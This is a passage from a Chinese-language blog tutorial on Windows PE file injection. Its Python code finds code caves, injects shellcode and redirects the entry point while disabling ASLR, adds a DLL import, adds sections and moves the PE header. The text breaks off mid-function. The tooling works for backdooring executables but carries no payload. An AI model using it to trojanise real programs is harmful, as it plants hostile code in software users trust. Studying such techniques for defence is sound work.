<!DOCTYPE html>
<html>
  <head>
     
    <meta charset="UTF-8">
    <title>注入、劫持和Hook——Windows安全入门（一） - REOP</title>
    <link rel="shortcut icon" href="/static/img/icon.png">
    <link rel="icon" href="/static/img/icon.png" sizes="192x192"/>
    
<link rel="stylesheet" href="/static/kico.css">
<link rel="stylesheet" href="/static/hingle.css">

    
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">

    <meta name="viewport" content="width=device-width, maximum-scale=1, initial-scale=1"/>
    <meta property="og:site_name" content="REOP">
    <meta property="og:title" content="注入、劫持和Hook——Windows安全入门（一）"/>
    
<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="REOP" type="application/atom+xml">
</head>

  <body>
    <header>
    <div class="head-title">
        <h4>REOP</h4>
    </div>
    <div class="head-action">
        <div class="toggle-btn"></div>
        <div class="light-btn"></div>
        <div class="search-btn"></div>
    </div>
    <form class="head-search" method="post">
        <input type="text" name="s" placeholder="搜索什么？">
    </form>
    <nav class="head-menu">
        <a href="/">首页</a>
        <div class="has-child">
            <a>分类</a>
            <div class="sub-menu">
                <a class="category-link" href="/categories/Windows/">Windows</a>
            </div>
        </div>
        
            <a href="/">关于我</a>
        
            <a href="/">朋友们</a>
        
    </nav>
</header>

    <main>
    <div class="wrap min">
        <section class="post-title">
            <h2>注入、劫持和Hook——Windows安全入门（一）</h2>
            <div class="post-meta">
                <time class="date">2024.03.02</time>
            
                <span class="category"><a class="category-link" href="/categories/Windows/">Windows</a></span>
            
            </div>
        </section>
        <article class="post-content">
        
            <h2 id="1-PE注入"><a href="#1-PE注入" class="headerlink" title="1 PE注入"></a>1 PE注入</h2><p>PE注入就是对静态的PE文件进行修改，使其在运行时能够加载我们需要的构造的代码。因为都是对文件进行静态的修改，只需要处理好RVA和Offset之间的转换，保证PE完整的结构就好，相对来说比较简单。<br>此部分代码都使用Python实现，使用pefile模块对PE文件进行操作，十分方便。当然因为PE的结构就是通过头文件定义的，使用C语言也很方便。</p>
<h3 id="1-1-寻找空洞"><a href="#1-1-寻找空洞" class="headerlink" title="1.1 寻找空洞"></a>1.1 寻找空洞</h3><p>寻找代码中的空闲区域的大小，作为PE注入前的参考。<br>参考了<em><strong>cave miner</strong></em>项目，但是我没有研究其源码，只是按照其原理通过比较节表中的 SizeOfRawData 和 Misc_VirtualSize 属性，实现了最简单的功能。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pefile <span class="keyword">import</span> PE  </span><br><span class="line"><span class="keyword">import</span> sys  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">search_cave</span>(<span class="params">filename, minsize=<span class="number">0</span></span>):  </span><br><span class="line">    <span class="string">&quot;&quot;&quot;  </span></span><br><span class="line"><span class="string">    搜索代码空洞  </span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span>    pe = PE(filename)  </span><br><span class="line">    caves = []  </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[*] FileAlign:\t<span class="subst">&#123;pe.OPTIONAL_HEADER.FileAlignment&#125;</span>Bytes&quot;</span>)  </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[*] SectAlign:\t<span class="subst">&#123;pe.OPTIONAL_HEADER.SectionAlignment&#125;</span>Bytes\n&quot;</span>)  </span><br><span class="line">    <span class="comment"># 1. Cave Before Sections  </span></span><br><span class="line">    sectionDataBegin = pe.sections[<span class="number">0</span>].PointerToRawData  </span><br><span class="line">    sectionTableEnd = pe.sections[-<span class="number">1</span>].__file_offset__ + pe.sections[-<span class="number">1</span>].sizeof()  </span><br><span class="line">    caveSize = sectionDataBegin - sectionTableEnd - <span class="number">40</span>  </span><br><span class="line">    RVA = sectionTableEnd  </span><br><span class="line">    flags = <span class="number">0</span>  </span><br><span class="line">    <span class="keyword">if</span> caveSize &gt; minsize:  </span><br><span class="line">       caves.append(  </span><br><span class="line">          [<span class="string">&#x27;BEFORE &#x27;</span> + pe.sections[<span class="number">0</span>].Name.decode().rstrip(<span class="string">&#x27;\x00&#x27;</span>), sectionTableEnd + <span class="number">40</span>, sectionDataBegin, caveSize, RVA,  </span><br><span class="line">           flags])  </span><br><span class="line">    <span class="comment"># 2. Cave In Each Sections  </span></span><br><span class="line">    <span class="keyword">for</span> section <span class="keyword">in</span> pe.sections:  </span><br><span class="line">       caveSize = section.SizeOfRawData - section.Misc_VirtualSize  </span><br><span class="line">       <span class="keyword">if</span> caveSize &gt; minsize:  </span><br><span class="line">          begin = section.PointerToRawData + section.Misc_VirtualSize  </span><br><span class="line">          RVA = section.VirtualAddress + section.Misc_VirtualSize  </span><br><span class="line">          flags = (section.Characteristics &amp; <span class="number">0xf0000000</span>) &gt;&gt; <span class="number">29</span>  </span><br><span class="line">          <span class="comment"># print(flags)  </span></span><br><span class="line">          caves.append([<span class="string">&#x27;IN &#x27;</span> + section.Name.decode().rstrip(<span class="string">&#x27;\x00&#x27;</span>), begin, begin + caveSize, caveSize, RVA, flags])  </span><br><span class="line">    <span class="keyword">for</span> cave <span class="keyword">in</span> caves:  </span><br><span class="line">       <span class="built_in">print</span>(<span class="string">&quot;[+] &quot;</span> + cave[<span class="number">0</span>], end=<span class="string">&quot;:\n&quot;</span>)  </span><br><span class="line">       <span class="built_in">print</span>(<span class="string">&quot;\t\tBegin:\t&quot;</span> + <span class="built_in">hex</span>(cave[<span class="number">1</span>])[<span class="number">2</span>:], end=<span class="string">&quot;h\n&quot;</span>)  </span><br><span class="line">       <span class="built_in">print</span>(<span class="string">&quot;\t\tEnd:\t&quot;</span> + <span class="built_in">hex</span>(cave[<span class="number">2</span>])[<span class="number">2</span>:], end=<span class="string">&quot;h\n&quot;</span>)  </span><br><span class="line">       <span class="built_in">print</span>(<span class="string">&quot;\t\tSize:\t&quot;</span> + <span class="built_in">hex</span>(cave[<span class="number">3</span>])[<span class="number">2</span>:] + <span class="string">&#x27;h (&#x27;</span> + <span class="built_in">str</span>(cave[<span class="number">3</span>]) + <span class="string">&#x27;Bytes)&#x27;</span>, end=<span class="string">&quot;\n&quot;</span>)  </span><br><span class="line">       <span class="built_in">print</span>(<span class="string">&quot;\t\tRVA:\t&quot;</span> + <span class="built_in">hex</span>(cave[<span class="number">4</span>])[<span class="number">2</span>:], end=<span class="string">&quot;h\n&quot;</span>)  </span><br><span class="line">       flags = <span class="built_in">list</span>(<span class="string">&#x27;---&#x27;</span>)  </span><br><span class="line">       <span class="keyword">if</span> cave[<span class="number">5</span>] &amp; <span class="number">4</span>:  </span><br><span class="line">          flags[<span class="number">0</span>] = <span class="string">&#x27;w&#x27;</span>  </span><br><span class="line">       <span class="keyword">if</span> cave[<span class="number">5</span>] &amp; <span class="number">2</span>:  </span><br><span class="line">          flags[<span class="number">1</span>] = <span class="string">&#x27;r&#x27;</span>  </span><br><span class="line">       <span class="keyword">if</span> cave[<span class="number">5</span>] &amp; <span class="number">1</span>:  </span><br><span class="line">          flags[<span class="number">2</span>] = <span class="string">&#x27;x&#x27;</span>  </span><br><span class="line">       <span class="built_in">print</span>(<span class="string">&quot;\t\tFlags:\t&quot;</span> + <span class="string">&#x27;&#x27;</span>.join(flags), end=<span class="string">&quot;\n&quot;</span>)  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:  </span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &lt; <span class="number">2</span>:  </span><br><span class="line">       <span class="built_in">print</span>(<span class="string">&quot;[Usage] python search.py &lt;filename&gt; [minsize]&quot;</span>)  </span><br><span class="line">       exit(<span class="number">0</span>)  </span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) == <span class="number">2</span>:  </span><br><span class="line">       search_cave(sys.argv[<span class="number">1</span>])  </span><br><span class="line">    <span class="keyword">else</span>:  </span><br><span class="line">       search_cave(sys.argv[<span class="number">1</span>], <span class="built_in">int</span>(sys.argv[<span class="number">2</span>]))</span><br></pre></td></tr></table></figure>
<h3 id="1-2-注入shellcode"><a href="#1-2-注入shellcode" class="headerlink" title="1.2 注入shellcode"></a>1.2 注入shellcode</h3><p>向空洞中注入shellcode，然后修改OEP指向shellcode的入口。需要注意的是要确保注入点的节具有执行权限。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">inject_shellcode</span>(<span class="params">filename, offset, payload</span>):  </span><br><span class="line">    <span class="string">&quot;&quot;&quot;  </span></span><br><span class="line"><span class="string">    代码空洞注入shellcode  </span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span>    pe = PE(filename)  </span><br><span class="line">    rva = pe.get_rva_from_offset(offset)  </span><br><span class="line">    data_size = <span class="built_in">len</span>(payload) + <span class="number">5</span>  </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(data_size):  </span><br><span class="line">       <span class="keyword">if</span> pe.__data__[offset + i] != <span class="number">0</span>:  </span><br><span class="line">          <span class="built_in">print</span>(<span class="string">&quot;[!] The cave is too small!&quot;</span>)  </span><br><span class="line">          <span class="keyword">return</span>  </span><br><span class="line">    <span class="comment"># 添加call指令  </span></span><br><span class="line">    opcode = <span class="string">b&#x27;\xe8&#x27;</span> + (-data_size).to_bytes(<span class="number">4</span>, byteorder=<span class="string">&#x27;little&#x27;</span>, signed=<span class="literal">True</span>)  </span><br><span class="line">    payload += opcode  </span><br><span class="line">    <span class="comment"># 修改OEP  </span></span><br><span class="line">    new_oep = rva + data_size - <span class="number">5</span>  </span><br><span class="line">    pe.OPTIONAL_HEADER.AddressOfEntryPoint = new_oep  </span><br><span class="line">    <span class="comment"># 关闭ASLR  </span></span><br><span class="line">    pe.OPTIONAL_HEADER.DllCharacteristics &amp;= <span class="number">0xff</span>  </span><br><span class="line">    <span class="comment"># 定位节  </span></span><br><span class="line">    inject_section = pe.sections[<span class="number">0</span>]  </span><br><span class="line">    <span class="keyword">for</span> section <span class="keyword">in</span> pe.sections:  </span><br><span class="line">       <span class="keyword">if</span> offset &lt;= section.PointerToRawData + section.SizeOfRawData:  </span><br><span class="line">          inject_section = section  </span><br><span class="line">          <span class="keyword">break</span>  </span><br><span class="line">    inject_section.Characteristics |= <span class="number">0xe0000000</span>  </span><br><span class="line">    <span class="comment"># 注入shellcode  </span></span><br><span class="line">    pe.__data__ = pe.__data__[:offset] + payload + pe.__data__[offset + <span class="built_in">len</span>(payload):]  </span><br><span class="line">    <span class="comment"># pe.set_data_bytes(offset, shellcode)  </span></span><br><span class="line">    <span class="comment"># 写入文件  </span></span><br><span class="line">    modified_filename = filename.replace(<span class="string">&#x27;.exe&#x27;</span>, <span class="string">&#x27;_injected.exe&#x27;</span>)  </span><br><span class="line">    pe.write(modified_filename)  </span><br><span class="line">    pe.close()  </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+] Injected PE file saved as: <span class="subst">&#123;modified_filename&#125;</span>.&quot;</span>)</span><br></pre></td></tr></table></figure>
<h3 id="1-3-注入导入表"><a href="#1-3-注入导入表" class="headerlink" title="1.3 注入导入表"></a>1.3 注入导入表</h3><p>通过注入导入表使PE文件可以加载任意的DLL，但是导入表的后面一般没有足够的空间来添加表项，此时需要将原来的整个导入表复制到足够大的空洞处再新增表项，同时修改可选头中标识的导入表的RVA。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">inject_import</span>(<span class="params">filename, offset</span>):  </span><br><span class="line">    <span class="string">&quot;&quot;&quot;  </span></span><br><span class="line"><span class="string">    注入导入表  </span></span><br><span class="line"><span class="string">    :return:  </span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span>    pe = PE(filename)  </span><br><span class="line">    <span class="comment"># 复制旧IDT  </span></span><br><span class="line">    IDT_offset = pe.get_offset_from_rva(pe.OPTIONAL_HEADER.DATA_DIRECTORY[<span class="number">1</span>].VirtualAddress)  </span><br><span class="line">    IDT_size = pe.OPTIONAL_HEADER.DATA_DIRECTORY[<span class="number">1</span>].Size - <span class="number">20</span>  </span><br><span class="line">    IDT_data = pe.__data__[IDT_offset:IDT_offset+IDT_size]  </span><br><span class="line">    pe.set_data_bytes(offset, IDT_data)  </span><br><span class="line">    <span class="comment"># 新建一个IDT项  </span></span><br><span class="line">    begin = offset + IDT_size  </span><br><span class="line">    new_IDT = SectionStructure(pe.__IMAGE_IMPORT_DESCRIPTOR_format__)  </span><br><span class="line">    new_IDT.__unpack__(<span class="built_in">bytearray</span>(new_IDT.sizeof()))  </span><br><span class="line">    new_IDT.set_file_offset(begin)  </span><br><span class="line">    begin += <span class="number">40</span>  </span><br><span class="line">    <span class="comment"># INT  </span></span><br><span class="line">    new_IDT.OriginalFirstThunk = pe.get_rva_from_offset(begin)  </span><br><span class="line">    new_INT = SectionStructure(pe.__IMAGE_THUNK_DATA_format__)  </span><br><span class="line">    new_INT.__unpack__(<span class="built_in">bytearray</span>(new_INT.sizeof()))  </span><br><span class="line">    new_INT.set_file_offset(begin)  </span><br><span class="line">    begin += <span class="number">8</span>  </span><br><span class="line">    <span class="comment"># IAT  </span></span><br><span class="line">    new_IDT.FirstThunk = pe.get_rva_from_offset(begin)  </span><br><span class="line">    new_IAT = SectionStructure(pe.__IMAGE_THUNK_DATA_format__)  </span><br><span class="line">    new_IAT.__unpack__(<span class="built_in">bytearray</span>(new_IAT.sizeof()))  </span><br><span class="line">    new_IAT.set_file_offset(begin)  </span><br><span class="line">    begin += <span class="number">8</span>  </span><br><span class="line">    <span class="comment"># funcName  </span></span><br><span class="line">    funcName = <span class="string">b&#x27;\x00\x00show\x00&#x27;</span>  </span><br><span class="line">    pe.set_data_bytes(begin, funcName)  </span><br><span class="line">    new_INT.AddressOfData = pe.get_rva_from_offset(begin)  </span><br><span class="line">    new_IAT.AddressOfData = pe.get_rva_from_offset(begin)  </span><br><span class="line">    begin += <span class="built_in">len</span>(funcName) + <span class="number">3</span>  </span><br><span class="line">    <span class="comment"># dllName  </span></span><br><span class="line">    dllName = <span class="string">b&#x27;Hello.dll\x00&#x27;</span>  </span><br><span class="line">    pe.set_data_bytes(begin, dllName)  </span><br><span class="line">    new_IDT.Name = pe.get_rva_from_offset(begin)  </span><br><span class="line">    pe.__structures__.append(new_IDT)  </span><br><span class="line">    pe.__structures__.append(new_INT)  </span><br><span class="line">    pe.__structures__.append(new_IAT)  </span><br><span class="line">    <span class="comment"># 更改扩展头中的IDT的地址  </span></span><br><span class="line">    pe.OPTIONAL_HEADER.DATA_DIRECTORY[<span class="number">1</span>].VirtualAddress = pe.get_rva_from_offset(offset)  </span><br><span class="line">    pe.OPTIONAL_HEADER.DATA_DIRECTORY[<span class="number">1</span>].Size += <span class="number">20</span>  </span><br><span class="line">    <span class="comment"># 修改节权限  </span></span><br><span class="line">    inject_section = <span class="literal">None</span>  </span><br><span class="line">    <span class="keyword">for</span> section <span class="keyword">in</span> pe.sections:  </span><br><span class="line">       <span class="keyword">if</span> offset &lt;= section.PointerToRawData + section.SizeOfRawData:  </span><br><span class="line">          inject_section = section  </span><br><span class="line">          <span class="keyword">break</span>  </span><br><span class="line">    inject_section.Characteristics = <span class="number">0xc0000000</span>  </span><br><span class="line">    <span class="comment"># pe.merge_modified_section_data()  </span></span><br><span class="line">    <span class="comment">#  写入文件  </span></span><br><span class="line">    modified_filename = filename.replace(<span class="string">&#x27;.exe&#x27;</span>, <span class="string">&#x27;_dll.exe&#x27;</span>)  </span><br><span class="line">    pe.write(modified_filename)  </span><br><span class="line">    pe.close()  </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+] Modified PE file saved as: <span class="subst">&#123;modified_filename&#125;</span>.&quot;</span>)</span><br></pre></td></tr></table></figure>
<h3 id="1-4-新增节"><a href="#1-4-新增节" class="headerlink" title="1.4 新增节"></a>1.4 新增节</h3><p>如果现有的代码空洞不足以进行注入，那么可以通过更改PE结构来开辟更多的空洞。<br>利用节表和节数据之间的空闲区域再新增一个节，网上有很多详细的讲解，这里就不再赘述。<br>为了不需要移动其他的节数据，一般是在文件末尾新增节。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">add_section</span>(<span class="params">filename, data_size</span>):  </span><br><span class="line">    <span class="string">&quot;&quot;&quot;  </span></span><br><span class="line"><span class="string">    新增节  </span></span><br><span class="line"><span class="string">    :return: offset of new section data  </span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span>    pe = PE(filename)  </span><br><span class="line">    data_size += <span class="number">5</span>  </span><br><span class="line">    <span class="comment"># 计算是否足够新增节区头  </span></span><br><span class="line">    begin = pe.sections[-<span class="number">1</span>].__file_offset__ + pe.sections[-<span class="number">1</span>].sizeof()  </span><br><span class="line">    end = pe.sections[<span class="number">0</span>].PointerToRawData  </span><br><span class="line">    cave_size = end - begin  </span><br><span class="line">    <span class="comment"># data_size = len(shellcode) + 5  </span></span><br><span class="line">    <span class="keyword">if</span> cave_size &lt; <span class="number">80</span>:  </span><br><span class="line">       <span class="built_in">print</span>(<span class="string">&quot;[!] There is not enough cave to add a section header.&quot;</span>)  </span><br><span class="line">       <span class="keyword">return</span>  </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+] There are <span class="subst">&#123;cave_size - <span class="number">40</span>&#125;</span> (<span class="subst">&#123;cave_size&#125;</span> - 40) bytes cave to add section header.&quot;</span>)  </span><br><span class="line">    <span class="comment"># 构造新的节表  </span></span><br><span class="line">    new_section = SectionStructure(pe.__IMAGE_SECTION_HEADER_format__)  </span><br><span class="line">    new_section.__unpack__(<span class="built_in">bytearray</span>(new_section.sizeof()))  </span><br><span class="line">    new_section.set_file_offset(begin)  </span><br><span class="line">    new_section.Name = <span class="string">b&#x27;.new&#x27;</span>  </span><br><span class="line">    new_section.Misc_VirtualSize = data_size  </span><br><span class="line">    new_section.VirtualAddress = pe.sections[-<span class="number">1</span>].VirtualAddress + math.ceil(  </span><br><span class="line">       pe.sections[-<span class="number">1</span>].Misc_VirtualSize / pe.OPTIONAL_HEADER.SectionAlignment) * pe.OPTIONAL_HEADER.SectionAlignment  </span><br><span class="line">    new_section.SizeOfRawData = math.ceil(  </span><br><span class="line">       data_size / pe.OPTIONAL_HEADER.FileAlignment) * pe.OPTIONAL_HEADER.FileAlignment  </span><br><span class="line">    new_section.PointerToRawData = pe.sections[-<span class="number">1</span>].PointerToRawData + pe.sections[-<span class="number">1</span>].SizeOfRawData  </span><br><span class="line">    new_section.Characteristics = <span class="number">0x60000000</span>  </span><br><span class="line">    <span class="comment"># 修改节区数量和我文件大小  </span></span><br><span class="line">    pe.FILE_HEADER.NumberOfSections += <span class="number">1</span>  </span><br><span class="line">    pe.OPTIONAL_HEADER.SizeOfImage = math.ceil(pe.OPTIONAL_HEADER.SizeOfImage + pe.sections[  </span><br><span class="line">       -<span class="number">1</span>].Misc_VirtualSize / pe.OPTIONAL_HEADER.SectionAlignment) * pe.OPTIONAL_HEADER.SectionAlignment  </span><br><span class="line">      </span><br><span class="line">    <span class="comment"># 添加节头和节数据  </span></span><br><span class="line">    pe.__structures__.append(new_section)  </span><br><span class="line">    padding = <span class="string">b&#x27;\x00&#x27;</span> * new_section.SizeOfRawData  </span><br><span class="line">    <span class="comment"># pe.__data__ = pe.__data__[:] + padding  </span></span><br><span class="line">    pe.set_data_bytes(new_section.PointerToRawData, padding)  </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] New section added to PE file.&quot;</span>)  </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;\t[-] FOA: <span class="subst">&#123;<span class="built_in">hex</span>(new_section.PointerToRawData)[<span class="number">2</span>:].rjust(<span class="number">8</span>, <span class="string">&#x27;0&#x27;</span>)&#125;</span>h&quot;</span>)  </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;\t[-] RVA: <span class="subst">&#123;<span class="built_in">hex</span>(new_section.VirtualAddress)[<span class="number">2</span>:].rjust(<span class="number">8</span>, <span class="string">&#x27;0&#x27;</span>)&#125;</span>h&quot;</span>)  </span><br><span class="line">    <span class="comment"># 写入文件  </span></span><br><span class="line">    modified_filename = filename.replace(<span class="string">&#x27;.exe&#x27;</span>, <span class="string">&#x27;_modified.exe&#x27;</span>)  </span><br><span class="line">    pe.write(modified_filename)  </span><br><span class="line">    pe.close()  </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+] Modified PE file saved as: <span class="subst">&#123;modified_filename&#125;</span>.&quot;</span>)  </span><br><span class="line">    <span class="keyword">return</span> new_section.PointerToRawData</span><br></pre></td></tr></table></figure>
<h4 id="提升NT头"><a href="#提升NT头" class="headerlink" title="提升NT头"></a>提升NT头</h4><p>如果节表和节数据之间的空洞不足以再新增一个节，可以使用此方法将没用的DOS Stub段删除，将其后面的NT头整体上移覆盖掉这段数据，那么节表和节数据之间就可以腾出一些空洞。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">lift_header</span>(<span class="params">filename</span>):  </span><br><span class="line">    <span class="string">&quot;&quot;&quot;  </span></span><br><span class="line"><span class="string">    删除 dos_stub, 提升PE头  </span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span>    pe = PE(filename)  </span><br><span class="line">    begin = pe.DOS_HEADER.sizeof()  </span><br><span class="line">    end = pe.NT_HEADERS.__file_offset__  </span><br><span class="line">    offset = pe.sections[<span class="number">0</span>].PointerToRawData  </span><br><span class="line">    height = end - begin  </span><br><span class="line">    <span class="keyword">if</span> height &lt;= <span class="number">0</span>:  </span><br><span class="line">       <span class="built_in">print</span>(<span class="string">&quot;[!] No DOS stub to cover!&quot;</span>)  </span><br><span class="line">       <span class="keyword">return</span>  </span><br><span class="line">    <span class="comment"># 修改DOS头属性  </span></span><br><span class="line">    pe.DOS_HEADER.e_lfanew -= height  </span><br><span class="line">    pe.OPTIONAL_HEADER.CheckSum = pe.generate_checksum()  </span><br><span class="line">    <span class="comment"># 上移头部覆盖dos_stub  </span></span><br><span class="line">    padding = <span class="string">b&#x27;\x00&#x27;</span> * height  </span><br><span class="line">    pe.__data__ = pe.__data__[:begin] + pe.__data__[end:offset] + padding + pe.__data__[offset:]  </span><br><span class="line">    <span class="comment">#  写入文件  </span></span><br><span class="line">    modified_filename = filename.replace(<span class="string">&#x27;.exe&#x27;</span>, <span class="string">&#x27;_lifted.exe&#x27;</span>)  </span><br><span class="line">    <span class="comment"># pe.write(modified_filename)  </span></span><br><span class="line">    <span class="built_in">open</span>(modified_filename, <span class="string">&#x27;wb&#x27;</span>).write(pe.__data__)  </span><br><span class="line">    pe.close()  </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+] File header lifted by <span class="subst">&#123;height&#125;</span> bytes.&quot;</span>)  </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+] Modified PE file saved as: <span class="subst">&#123;modified_filename&#125;</span>.&quot;</span>)</span><br></pre></td></tr></table></figure>
<h3 id="1-5-合并节"><a href="#1-5-合并节" class="headerlink" title="1.5 合并节"></a>1.5 合并节</h3><p>这个方法也是为了新增节，通过合并两个节，节表就会腾出一个位置用来存放新增的节。<br>同样，为了不影响其他节，合并最后两个节是最好的选择。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">merge_sections</span>(<span class="params">filename</span>):  </span><br><span class="line">    <span class="string">&quot;&quot;&quot;  </span></span><br><span class="line"><span class="string">    合并节  </span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span>    pe = PE(filename)  </span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(pe.sections) &lt; <span class="number">2</span>:  </span><br><span class="line">       <span class="built_in">print</span>(<span class="string">&quot;[!] The section is too little!&quot;</span>)  </span><br><span class="line">       <span class="keyword">return</span>  </span><br><span class="line">    section1 = pe.sections[-<span class="number">2</span>]  </span><br><span class="line">    section2 = 